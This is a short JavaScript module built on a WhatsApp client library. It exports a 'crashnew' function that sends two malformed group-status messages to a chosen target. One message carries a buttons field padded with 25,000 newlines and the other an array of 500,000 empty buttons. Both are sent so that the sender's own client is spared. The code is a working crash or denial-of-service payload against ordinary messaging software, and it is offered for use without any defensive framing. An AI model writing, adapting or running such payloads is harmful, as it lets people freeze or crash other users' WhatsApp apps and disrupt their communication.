const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, groupStatusMessageV2 } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function crashnew(sock, target) {
    const rezzonly6 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐆𝐀𝐁𝐔𝐓 𝐀𝐍𝐉𝐈𝐍𝐆"
                    },
                    nativeFlowMessage: {
                        buttons: "\u200B" + "\n".repeat(25000)
                    }
                }
            }
        }
    };

    const rezzonly7 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "🦠Shahzu Here😹"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };
        await sock.relayMessage(target, rezzonly6, { noSelfSync: true });
        await sock.relayMessage(target, rezzonly7, { noSelfSync: true });
    }
    
module.exports = { crashnew };